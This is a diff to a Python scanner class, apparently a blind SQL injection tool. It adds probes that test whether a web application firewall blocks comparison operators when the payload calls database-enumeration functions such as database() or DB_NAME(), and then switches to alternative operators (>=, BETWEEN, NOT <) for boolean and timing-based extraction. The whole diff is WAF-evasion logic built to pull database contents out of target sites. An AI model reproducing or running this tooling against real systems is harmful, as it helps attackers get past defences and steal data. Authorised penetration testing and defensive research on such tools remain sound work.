@@ -60454,6 +60454,12 @@ class Scanner:
         async def _probe_operator_alternatives():
             """Test if > works with extraction payload, try alternatives if not."""
             nonlocal _op_char_tpl, _waf_blocks_gt, _use_bitwise_fallback, _len_tpl  # BUG-PROBE-OPERATOR-NONLOCAL-FIX: added _len_tpl
+            # BUG-PROBE-OPERATOR-ENUM-FN-FIX: initialise the secondary enum-fn probe
+            # variable here so the alternatives loop (Step 2) can reference it even when
+            # reached via the direct > truly-blocked path (_simple is not True) rather
+            # than the fall-through from the enum-fn secondary test. Without this, Step 2
+            # would raise NameError for _dbms_enum_fn_probe2 in the alternatives loop.
+            _dbms_enum_fn_probe2 = None  # set to enum fn string if secondary test runs
 
             # BUG-PROBE-OPERATOR-LITERAL-Z FIX (CRITICAL): The original test used
             # "SELECT 'z'" — a string literal.  WAFs that block comparison operators
@@ -60496,7 +60502,61 @@ class Scanner:
                 if r_t is True and r_f is False:
                     LOG.info("[Inference] Operator > works with extraction pattern "
                              "(verified via %s: mid=64→True, mid=200→False)", _dbms_char_fn_probe)
-                    return
+                    # BUG-PROBE-OPERATOR-ENUM-FN-FIX (CRITICAL): CHAR(122) passes because it
+                    # is a safe value function; Fastly/Imperva WAFs selectively block > (and
+                    # sometimes >=) when the subquery is a data-enumeration function (database(),
+                    # user(), VERSION()) while allowing CHAR(122)/CHR(122) which don't leak DB
+                    # state.  Without a secondary test we leave _waf_blocks_gt=False even though
+                    # actual extraction with ORD(MID((SELECT database()),1,1))>=mid is WAF-blocked.
+                    # Downstream: bisection always receives oracle-True → lo races to 1,114,111 →
+                    # bisection guards abort → equality fallback → RC9 detects WAF-uniform → empty
+                    # positions → empty result. BUG7-RETRY then tries alternatives like DATABASE/**/()
+                    # but those also use > for length probes which are equally blocked.
+                    # Fix: probe with the DBMS-specific enumeration function using sentinel midpoints
+                    # (>=3 = True for any printable first char; >=9999 = False for ASCII/BMP).
+                    # Sentinel choice: 3 is below printable ASCII floor (32) so any real DB-name
+                    # first char satisfies >=3; 9999 is above ASCII ceiling (127) and BMP (65535)
+                    # for practical DB names. If WAF blocks the enum-fn form (both probes return
+                    # oracle-True, or True/None, meaning the WAF can't distinguish True from False),
+                    # set _waf_blocks_gt=True and fall through to the alternatives block below
+                    # (which tests >=, BETWEEN, NOT < with CHAR(122) AND the enum-fn).
+                    _dbms_enum_fn_probe2 = {
+                        "MySQL":    "database()", "MariaDB":  "database()",
+                        "TiDB":     "database()",
+                        "PostgreSQL": "current_database()",
+                        "CockroachDB": "current_database()",
+                        "YugabyteDB":  "current_database()",
+                        "Amazon Redshift": "current_database()",
+                        "MSSQL":    "DB_NAME()",
+                        "Sybase":   "DB_NAME()",
+                        "ClickHouse": "currentDatabase()",
+                    }.get(_dbms)  # None for Oracle/SQLite/DB2/Firebird/SAP_HANA/H2 — skip test
+                    if _dbms_enum_fn_probe2:
+                        _test_ef_t = _char_tpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "3")
+                        _test_ef_f = _char_tpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "9999")
+                        await asyncio.sleep(_delay * 0.5)
+                        _r_ef_t = await _eval(_test_ef_t)
+                        await asyncio.sleep(_delay * 0.5)
+                        _r_ef_f = await _eval(_test_ef_f)
+                        if _r_ef_t is True and _r_ef_f is False:
+                            LOG.info("[Inference] Operator > also verified with enum-fn %s "
+                                     "(mid=3→True, mid=9999→False) — extraction safe",
+                                     _dbms_enum_fn_probe2)
+                            return
+                        else:
+                            # WAF distinguishes CHAR(122) from data-enumeration functions.
+                            # > passes for CHAR(122) but is blocked/ambiguous for enum-fn.
+                            LOG.info(
+                                "[Inference] > blocked for enum-fn %s "
+                                "(r_true=%s, r_false=%s) despite passing CHAR(122) — "
+                                "WAF pattern-matches on data-enumeration functions; "
+                                "falling through to test alternative operators",
+                                _dbms_enum_fn_probe2, _r_ef_t, _r_ef_f)
+                            _waf_blocks_gt = True
+                            # DO NOT return — fall through to Step 2 to try >=, BETWEEN, NOT <
+                    else:
+                        # No enum-fn probe available for this DBMS — trust CHAR(122) result
+                        return
                 else:
                     # > fails with extraction pattern: either WAF blocks all function-based
                     # comparisons (returns 403=True for everything → r_f is also True), or the
@@ -60594,20 +60654,79 @@ class Scanner:
                     await asyncio.sleep(_delay)
                     _r2f = await _eval(_test2f)
                     if _r2 is True and _r2f is False:
-                        _op_char_tpl = _atpl
-                        LOG.info("[Inference]  Using operator (boolean): %s", _aname)
-                        _use_bitwise_fallback = False
-                        # Update _len_tpl to match the working operator (same as timing path)
-                        if ">={mid}" in _atpl or ">={mid}" in _aname:
-                            _len_tpl = _len_tpl.replace(">{mid}", ">={mid}")
-                        elif "BETWEEN" in (_atpl or "").upper():
-                            if ">{mid}" in _len_tpl:
-                                _len_tpl = _len_tpl.replace(">{mid}", " BETWEEN {mid} AND 99999")
-                        elif "NOT" in (_atpl or "").upper() and "<{mid}" in _atpl:
-                            _len_tpl = _len_tpl.replace(">{mid}", ">={mid}")
-                        LOG.info("[Inference] Updated _len_tpl operator (boolean path): %s", _aname)
-                        return  # Found working operator — stop testing alternatives
+                        # BUG-PROBE-OPERATOR-ENUM-FN-FIX (alternatives): CHAR(122) confirmed
+                        # this alternative operator works. Now verify it also works with an
+                        # actual data-enumeration function (same secondary test as the primary
+                        # > check above). WAFs that block specific enumeration functions in
+                        # comparison contexts would block >= / BETWEEN / NOT < as well when
+                        # combined with database()/current_database()/DB_NAME().
+                        # If enum-fn test fails for this alternative too, continue to the next
+                        # alternative rather than accepting a CHAR(122)-only false positive.
+                        _alt_enum_ok = True  # Assume OK if no enum-fn probe available
+                        if _dbms_enum_fn_probe2:
+                            _test_alt_ef_t = _atpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "3")
+                            _test_alt_ef_f = _atpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "9999")
+                            await asyncio.sleep(_delay * 0.5)
+                            _r_alt_ef_t = await _eval(_test_alt_ef_t)
+                            await asyncio.sleep(_delay * 0.5)
+                            _r_alt_ef_f = await _eval(_test_alt_ef_f)
+                            if _r_alt_ef_t is True and _r_alt_ef_f is False:
+                                LOG.info("[Inference] Alt operator %s also verified with "
+                                         "enum-fn %s (mid=3→True, mid=9999→False)",
+                                         _aname, _dbms_enum_fn_probe2)
+                            else:
+                                LOG.info(
+                                    "[Inference] Alt operator %s passes CHAR(122) but "
+                                    "blocked for enum-fn %s (r_true=%s, r_false=%s) — "
+                                    "trying next alternative",
+                                    _aname, _dbms_enum_fn_probe2, _r_alt_ef_t, _r_alt_ef_f)
+                                _alt_enum_ok = False
+                        if _alt_enum_ok:
+                            _op_char_tpl = _atpl
+                            LOG.info("[Inference]  Using operator (boolean): %s", _aname)
+                            _use_bitwise_fallback = False
+                            # Update _len_tpl to match the working operator (same as timing path)
+                            if ">={mid}" in _atpl or ">={mid}" in _aname:
+                                _len_tpl = _len_tpl.replace(">{mid}", ">={mid}")
+                            elif "BETWEEN" in (_atpl or "").upper():
+                                if ">{mid}" in _len_tpl:
+                                    _len_tpl = _len_tpl.replace(">{mid}", " BETWEEN {mid} AND 99999")
+                            elif "NOT" in (_atpl or "").upper() and "<{mid}" in _atpl:
+                                _len_tpl = _len_tpl.replace(">{mid}", ">={mid}")
+                            LOG.info("[Inference] Updated _len_tpl operator (boolean path): %s", _aname)
+                            return  # Found working operator — stop testing alternatives
                 elif ms2 > 30 and ms2f > 30 and ms2 - ms2f > 50:
+                    # BUG-PROBE-OPERATOR-ENUM-FN-FIX (timing alternatives): CHAR(122)
+                    # confirmed a timing difference for this alternative operator.  The same
+                    # WAF pattern-match risk applies as the boolean path: Fastly/Imperva may
+                    # allow CHAR(122) comparisons while selectively blocking data-enumeration
+                    # functions (database(), user(), VERSION()) in the same operator context.
+                    # Without a secondary enum-fn test we accept a CHAR(122)-only false positive
+                    # and arm extraction with an operator that WAF will block for real payloads.
+                    # Fix: if _dbms_enum_fn_probe2 is set (function-selective WAF detected in
+                    # Step 1), verify timing with the actual enum-fn before accepting the alt.
+                    _alt_enum_ok_t = True
+                    if _dbms_enum_fn_probe2:
+                        _test_alt_ef_t = _atpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "3")
+                        _test_alt_ef_f = _atpl.replace("[QUERY]", "SELECT " + _dbms_enum_fn_probe2).replace("{pos}", "1").replace("{mid}", "9999")
+                        await asyncio.sleep(_delay * 0.5)
+                        _, _ms_alt_ef_t = await _send_payload(_test_alt_ef_t)
+                        await asyncio.sleep(_delay * 0.5)
+                        _, _ms_alt_ef_f = await _send_payload(_test_alt_ef_f)
+                        if _ms_alt_ef_t > 30 and _ms_alt_ef_f < _ms_alt_ef_t - 50:
+                            LOG.info("[Inference] Alt operator %s timing-verified with "
+                                     "enum-fn %s (ms_true=%dms, ms_false=%dms) — extraction safe",
+                                     _aname, _dbms_enum_fn_probe2, _ms_alt_ef_t, _ms_alt_ef_f)
+                        else:
+                            LOG.info(
+                                "[Inference] Alt operator %s passes CHAR(122) timing but "
+                                "blocked for enum-fn %s (ms_true=%dms, ms_false=%dms) — "
+                                "trying next alternative",
+                                _aname, _dbms_enum_fn_probe2, _ms_alt_ef_t, _ms_alt_ef_f)
+                            _alt_enum_ok_t = False
+                    if not _alt_enum_ok_t:
+                        await asyncio.sleep(_delay)
+                        continue  # enum-fn blocked for this alt — try next alternative
                     _op_char_tpl = _atpl
                     LOG.info("[Inference]  Using operator: %s", _aname)
                     _use_bitwise_fallback = False  # found a working operator, no need for bitwise
